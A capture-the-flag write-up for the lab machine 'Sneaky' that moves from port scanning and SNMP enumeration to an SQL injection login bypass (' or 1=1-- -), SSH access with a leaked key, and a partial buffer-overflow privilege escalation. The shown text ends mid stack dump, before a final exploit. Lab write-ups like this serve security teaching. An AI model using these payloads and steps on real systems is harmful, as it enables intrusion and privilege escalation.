I"ԣ<h1 id="masscan--nmap">Masscan + Nmap</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 161/udp on 10.10.10.20
Discovered open port 80/tcp on 10.10.10.20
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Parse those ports to nmap:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
nmap <span class="nt">-sVCTU</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
PORT    STATE  SERVICE VERSION
PORT    STATE  SERVICE VERSION
80/tcp  open   http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Under Development!
161/udp open   snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: fcf2da02d0831859
|   snmpEngineBoots: 8
|_  snmpEngineTime: 3m31s
| snmp-netstat:
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          <span class="k">*</span>:<span class="k">*</span>
| snmp-processes:
|   1:
|     Name: init
|     Path: /sbin/init
|   407:
|     Name: upstart-udev-br
|     Path: upstart-udev-bridge
|     Params: <span class="nt">--daemon</span>
|   411:
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|     Params: <span class="nt">--daemon</span>
|   470:
|     Name: dbus-daemon
|     Path: dbus-daemon
|     Params: <span class="nt">--system</span> <span class="nt">--fork</span>
|   488:
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   492:
|     Name: rsyslogd
|     Path: rsyslogd
|   514:
|     Name: upstart-file-br
|     Path: upstart-file-bridge
|     Params: <span class="nt">--daemon</span>
|   803:
|     Name: upstart-socket-
|     Path: upstart-socket-bridge
|     Params: <span class="nt">--daemon</span>
|   947:
|     Name: getty
|     Path: /sbin/getty
|     Params: <span class="nt">-8</span> 38400 tty4
|   992:
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: <span class="nt">-D</span>
|   995:
|     Name: cron
|     Path: cron
|   996:
|     Name: acpid
|     Path: acpid
|     Params: <span class="nt">-c</span> /etc/acpi/events <span class="nt">-s</span> /var/run/acpid.socket
|   1059:
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   1072:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: <span class="nt">-Lsd</span> <span class="nt">-Lf</span> /dev/null <span class="nt">-u</span> snmp <span class="nt">-g</span> snmp <span class="nt">-I</span> <span class="nt">-smux</span> mteTrigger mteTriggerConf <span class="nt">-p</span> /var/run/snmpd.pid
Service Info: Host: Sneaky

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>67.20 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="http">HTTP</h1>

<p>Directory bruteforcing:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-u</span> http://10.10.10.20/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  <span class="nt">-fc</span> 401,403,405 <span class="nt">-e</span> .txt,.php,.zip,.bak,.html

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .zip .bak .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

index.html              [Status: 200, Size: 183, Words: 10, Lines: 12]
dev                     [Status: 301, Size: 307, Words: 20, Lines: 10]
.                       [Status: 200, Size: 183, Words: 10, Lines: 12]
:: Progress: [378522/378522] :: Job [1/1] :: 431 req/sec :: Duration: [0:14:29] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Visiting /dev gives a login form. Tried common usernames and passwords, didn’t work.
Let’s try for SQL injection:
I tried <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> payload for password field and it logged in!
Page has this content:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>DevWebsite Login

name: admin

name: thrasivoulos

My Key

Noone is ever gonna find this key :P
</pre></td></tr></tbody></table></code></pre></div></div>
<p>And that <code class="language-plaintext highlighter-rouge">My Key</code> links to <code class="language-plaintext highlighter-rouge">/dev/sshkeyforadministratordifficulttimes</code> which contains private ssh key for thrasivoulos.</p>

<h1 id="snmp">SNMP</h1>

<p>Simple Network Management Protocol is a protocol used for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.
Brute forcing the community string with one-sixty-one:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>onesixtyone <span class="nt">-c</span> /opt/metasploit-framework/embedded/framework/data/wordlists/snmp_default_pass.txt <span class="sb">`</span>IP<span class="sb">`</span>
Scanning 1 hosts, 123 communities
10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Dumping SNMP-data:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>snmp-check <span class="nt">-p</span> 161 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-c</span> public <span class="nt">-d</span> <span class="nt">-v</span> 3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> System information:

  Host IP address               : 10.10.10.20
  Hostname                      : Sneaky
  Description                   : Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
  Contact                       : root
  Location                      : Unknown
  Uptime snmp                   : 00:18:48.47
  Uptime system                 : 00:18:43.51
  System <span class="nb">date</span>                   : 2021-7-21 16:29:17.0

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Processes:

  Id                    Status                Name                  Path                  Parameters
  1                     runnable              init                  /sbin/init
  992                   runnable              sshd                  /usr/sbin/sshd        <span class="nt">-D</span>
  1059                  runnable              mysqld                /usr/sbin/mysqld

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Software components:

  Index                 Name
  0                     accountsservice-0.6.35-0ubuntu7.3
  1                     acpid-1:2.0.21-1ubuntu2
  8                     apport-symptoms-0.20
  9                     apt-1.0.1ubuntu2.17
  10                    apt-transport-https-1.0.1ubuntu2.17
  383                   passwd-1:4.1.5.1-1ubuntu9.4
  384                   patch-2.7.1-4ubuntu2.3
  392                   php5-json-1.3.2-2build1
  456                   ssl-cert-1.0.33
  457                   strace-4.8-1ubuntu5
  458                   sudo-1.8.9p5-1ubuntu1.3
  467                   tcpdump-4.9.0-1ubuntu1~ubuntu14.04.1
  468                   telnet-0.17-36build2
  469                   time-1.7-24
  470                   tmux-1.8-5
  471                   tzdata-2016j-0ubuntu0.14.04
  476                   ucf-3.0027+nmu1
  477                   udev-204-5ubuntu20.24
  478                   ufw-0.34~rc-0ubuntu2
  487                   vim-common-2:7.4.052-1ubuntu3.1
  488                   vim-runtime-2:7.4.052-1ubuntu3.1
  489                   vim-tiny-2:7.4.052-1ubuntu3.1
  490                   w3m-0.5.3-15ubuntu0.1
  491                   wget-1.15-1ubuntu1.14.04.2
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I can see MySQL running in the background.</p>

<p>We can even use snmpwalk for more data with <code class="language-plaintext highlighter-rouge">snmpwalk -c public -v2c IP</code>.
But that shows tree structure output, which is weird to understand.
To prevent that, use <code class="language-plaintext highlighter-rouge">apt install snmp-mibs-downloader</code>, then edit <code class="language-plaintext highlighter-rouge">/etc/snmp/snmp.conf</code> and comment the mibs line.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v2c</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="o">&gt;</span> snmpwalk-v2c
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="finding-ipv6">Finding IPV6</h1>

<p>After checking out the data from snmp, I do get some IPv6 addresses:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>snmpwalk-v2c  | <span class="nb">grep</span> <span class="nt">-i</span> ipv6 | <span class="nb">grep</span> <span class="s1">'fe:80\|de:ad'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'"'</span> <span class="s1">'{print $2 }'</span>| <span class="nb">sort</span> <span class="nt">-u</span>
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:44:ec
fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:44:ec
fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:83:d8
</pre></td></tr></tbody></table></code></pre></div></div>

<p>But the formatting for ipv6 address is still wrong. They should be:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>dead:beef:0000:0000:0250:56ff:feb9:44ec
fe80:0000:0000:0000:0250:56ff:feb9:44ec
fe80:0000:0000:0000:0250:56ff:feb9:83d8
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running nmap on all the IPv6 addresses for port 22:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>ipv6<span class="si">)</span><span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-6</span> <span class="nv">$i</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p</span> 22  <span class="p">;</span> <span class="k">done
</span>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-22 17:05 IST

Nmap scan report <span class="k">for </span>dead:beef::250:56ff:feb9:44ec
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span><span class="nb">.</span>
PORT   STATE SERVICE
22/tcp open  ssh
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>0 hosts up<span class="o">)</span> scanned <span class="k">in </span>1.53 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> ./sshkeyforadministratordifficulttimes thrasivoulos@dead:beef::250:56ff:feb9:44ec
The authenticity of host <span class="s1">'dead:beef::250:56ff:feb9:44ec (dead:beef::250:56ff:feb9:44ec)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>dead:beef::250:56ff:feb9:44ec<span class="s1">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul 21 16:10:30 EEST 2021

  System load: 0.0               Memory usage: 4%   Processes:       176
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ 
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="privesc-using-bof">Privesc using BOF</h1>

<p>Checking for SUID perms, I get <code class="language-plaintext highlighter-rouge">/usr/local/bin/chal</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This binary is vulnerable to buffer-overflow.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span>/usr/local/bin/chal
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
thrasivoulos@Sneaky:~<span class="nv">$ </span>strings /usr/local/bin/chal | <span class="nb">grep </span>strcpy
strcpy
strcpy@@GLIBC_2.0
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="checking-protections">Checking Protections</h1>

<p>It’s turned off:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>No protections enabled:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="enumerating-chal">Enumerating chal</h1>

<p>Listing functions:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x080482b4  _init
0x080482f0  strcpy@plt
0x08048300  __gmon_start__@plt
0x08048310  __libc_start_main@plt
0x08048320  _start
0x08048350  __x86.get_pc_thunk.bx
0x08048360  deregister_tm_clones
0x08048390  register_tm_clones
0x080483d0  __do_global_dtors_aux
0x080483f0  frame_dummy
0x0804841d  main
0x08048450  __libc_csu_init
0x080484c0  __libc_csu_fini
0x080484c4  _fini
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Disassembling main, Nothing fancy.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>disass main                                                                          
Dump of assembler code <span class="k">for function </span>main:
   0x0804841d &lt;+0&gt;:     push   ebp
   0x0804841e &lt;+1&gt;:     mov    ebp,esp
   0x08048420 &lt;+3&gt;:     and    esp,0xfffffff0
   0x08048423 &lt;+6&gt;:     sub    esp,0x170
   0x08048429 &lt;+12&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x0804842c &lt;+15&gt;:    add    eax,0x4
   0x0804842f &lt;+18&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x08048431 &lt;+20&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048435 &lt;+24&gt;:    lea    eax,[esp+0x12]
   0x08048439 &lt;+28&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x0804843c &lt;+31&gt;:    call   0x80482f0 &lt;strcpy@plt&gt;
   0x08048441 &lt;+36&gt;:    mov    eax,0x0
   0x08048446 &lt;+41&gt;:    leave
   0x08048447 &lt;+42&gt;:    ret
End of assembler dump.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Also this binary copies given command-line argument to a variable.</p>

<h1 id="finding-offset">Finding offset</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern create 500
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
gdb-peda<span class="nv">$ </span>r <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>
Starting program: /root/HTB/Sneaky/privesc/chal <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x0
EBX: 0x0
ECX: 0xffffd400 <span class="o">(</span><span class="s2">"sgAs6A"</span><span class="o">)</span>
EDX: 0xffffd030 <span class="o">(</span><span class="s2">"sgAs6A"</span><span class="o">)</span>
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x41712541 <span class="o">(</span><span class="s1">'A%qA'</span><span class="o">)</span>
ESP: 0xffffcfb0 <span class="o">(</span><span class="s2">"rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs</span><span class="nv">$AsnAsCAs</span><span class="s2">-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A"</span><span class="o">)</span>
EIP: 0x25415525 <span class="o">(</span><span class="s1">'%UA%'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
Stopped reason: SIGSEGV
0x25415525 <span class="k">in</span> ?? <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Offset comes as <code class="language-plaintext highlighter-rouge">362</code> for EIP.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern search <span class="nv">$eip</span>
Registers contain pattern buffer:
EBP+0 found at offset: 358
EIP+0 found at offset: 362
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="confirming-the-offset">Confirming the offset</h1>

<p>Sending <code class="language-plaintext highlighter-rouge">362</code> A’s and <code class="language-plaintext highlighter-rouge">4</code> B’s and watching if they end up on <code class="language-plaintext highlighter-rouge">EIP</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("A"*362 + "B"*4)'</span><span class="si">)</span>
Starting program: /root/HTB/Sneaky/privesc/chal <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("A"*362 + "B"*4)'</span><span class="si">)</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x0
EBX: 0x0
ECX: 0xffffd400 <span class="o">(</span><span class="s2">"AABBBB"</span><span class="o">)</span>
EDX: 0xffffd02a <span class="o">(</span><span class="s2">"AABBBB"</span><span class="o">)</span>
ESI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EDI: 0xf7fa1000 <span class="nt">--</span><span class="o">&gt;</span> 0x1e4d6c
EBP: 0x41414141 <span class="o">(</span><span class="s1">'AAAA'</span><span class="o">)</span>
ESP: 0xffffd030 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="getting-binsh-shellcode">Getting /bin/sh shellcode</h1>

<p>Getting <code class="language-plaintext highlighter-rouge">/bin/sh</code> shellcode for x86, as it’s a 32bit binary.
Googling: <code class="language-plaintext highlighter-rouge">/bin/sh shellcode x86</code>
28 bytes: <a href="https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html">packetstorm</a></p>

<h1 id="getting-eip-address">Getting eip address</h1>

<p>I’ll send 400 bytes of B’s and see where in the stack they end up.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("B"*400)'</span><span class="si">)</span>
Starting program: /usr/local/bin/chal <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("B"*400)'</span><span class="si">)</span>
Program received signal SIGSEGV, Segmentation fault.
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running <code class="language-plaintext highlighter-rouge">x/100x $esp</code> shows some B’s which are nothing as compared to 400 we sent.
Trying to see 400 bytes behind <code class="language-plaintext highlighter-rouge">esp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/100x <span class="nv">$esp</span><span class="nt">-400</span>
0xbffff3b0:     0xbffff3d2      0x00000000      0x00000000      0x08048441
0xbffff3c0:     0xbffff3d2      0xbffff712      0x0804821d      0xb7fffc24
0xbffff3d0:     0x424218fc      0x42424242      0x42424242      0x42424242
0xbffff3e0:     0x42424242      0x42424242      0x42424242      0x42424242
